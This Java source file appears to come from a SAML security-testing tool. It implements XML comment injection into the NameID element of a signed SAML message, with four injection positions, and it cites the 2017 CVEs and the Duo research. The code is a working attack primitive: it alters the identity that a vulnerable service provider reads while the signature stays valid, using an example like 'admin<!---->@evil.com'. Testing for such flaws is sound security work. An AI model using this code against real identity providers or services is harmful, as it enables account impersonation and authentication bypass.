package helpers;

import org.w3c.dom.Comment;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.w3c.dom.Text;
import org.xml.sax.SAXException;

import java.io.IOException;

/// XML comment injection into SAML NameID values.
///
/// Different XML parsers handle comment nodes embedded within element text content
/// inconsistently. XML Signature exclusive C14N strips comments before computing
/// the digest, so the signature remains valid after injection. A vulnerable SP
/// that reads the raw NameID string (rather than the canonical form) may see a
/// truncated or altered identity — e.g., "admin<!---->@evil.com" can be read as
/// "admin" by parsers that return only the first text node.
///
/// Links:
/// * CVE-2017-11427 (OneLogin ruby-saml):   https://nvd.nist.gov/vuln/detail/CVE-2017-11427
/// * CVE-2017-11428 (ruby-saml):            https://nvd.nist.gov/vuln/detail/CVE-2017-11428
/// * CVE-2017-11429 (Clever):               https://nvd.nist.gov/vuln/detail/CVE-2017-11429
/// * CVE-2017-11430 (OmniAuth-SAML):        https://nvd.nist.gov/vuln/detail/CVE-2017-11430
/// * Duo research: https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations
/// * Academic paper: https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-li-junade.pdf
public class CommentInjection {

    public enum Position {
        BEFORE_AT("Before @ — user<!----> @domain  →  parser may return \"user\""),
        AFTER_AT("After @  — user@<!---->domain   →  parser may return \"user@\""),
        PREPEND("Prepend  — <!----> user@domain   →  parser may return \"\""),
        APPEND("Append   — user@domain<!---->     →  least effective, appended after value");

        private final String label;

        Position(String label) {
            this.label = label;
        }

        @Override
        public String toString() {
            return label;
        }

    }

    /// Injects an empty XML comment into the first NameID element.
    /// Works via DOM so namespace prefixes are handled correctly.
    /// The signature stays valid: exclusive C14N strips comments before digest
    /// computation, so the canonical form is unchanged.
    public static String apply(String samlMessage, Position position) throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        NodeList nameIDs = document.getElementsByTagNameNS("*", "NameID");
        if (nameIDs.getLength() == 0) {
            throw new IllegalArgumentException("No NameID element found in SAML message.");
        }

        Element nameID = (Element) nameIDs.item(0);
        String fullValue = nameID.getTextContent();

        // Clear existing child nodes of NameID, then rebuild with injected comment.
        while (nameID.hasChildNodes()) {
            nameID.removeChild(nameID.getFirstChild());
        }

        int atIdx = fullValue.indexOf('@');
        Comment comment = document.createComment("");

        switch (position) {
            case BEFORE_AT -> {
                if (atIdx >= 0) {
                    nameID.appendChild(text(document, fullValue.substring(0, atIdx)));
                    nameID.appendChild(comment);
                    nameID.appendChild(text(document, fullValue.substring(atIdx)));
                } else {
                    nameID.appendChild(text(document, fullValue));
                    nameID.appendChild(comment);
                }
            }
            case AFTER_AT -> {
                if (atIdx >= 0) {
                    nameID.appendChild(text(document, fullValue.substring(0, atIdx + 1)));
                    nameID.appendChild(comment);
                    nameID.appendChild(text(document, fullValue.substring(atIdx + 1)));
                } else {
                    int mid = fullValue.length() / 2;
                    nameID.appendChild(text(document, fullValue.substring(0, mid)));
                    nameID.appendChild(comment);
                    nameID.appendChild(text(document, fullValue.substring(mid)));
                }
            }
            case PREPEND -> {
                nameID.appendChild(comment);
                nameID.appendChild(text(document, fullValue));
            }
            case APPEND -> {
                nameID.appendChild(text(document, fullValue));
                nameID.appendChild(comment);
            }
        }

        return xmlHelpers.getString(document);
    }

    private static Text text(Document doc, String value) {
        return doc.createTextNode(value);
    }

    private CommentInjection() {}
}
